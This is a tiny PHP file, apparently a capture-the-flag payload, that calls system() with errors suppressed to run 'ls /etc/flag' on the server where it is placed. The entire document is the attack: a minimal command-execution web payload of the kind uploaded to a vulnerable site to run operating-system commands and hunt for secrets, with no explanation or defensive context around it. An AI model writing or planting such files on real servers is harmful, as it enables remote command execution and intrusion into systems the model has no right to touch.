<?php
@system('ls /etc/flag');
?>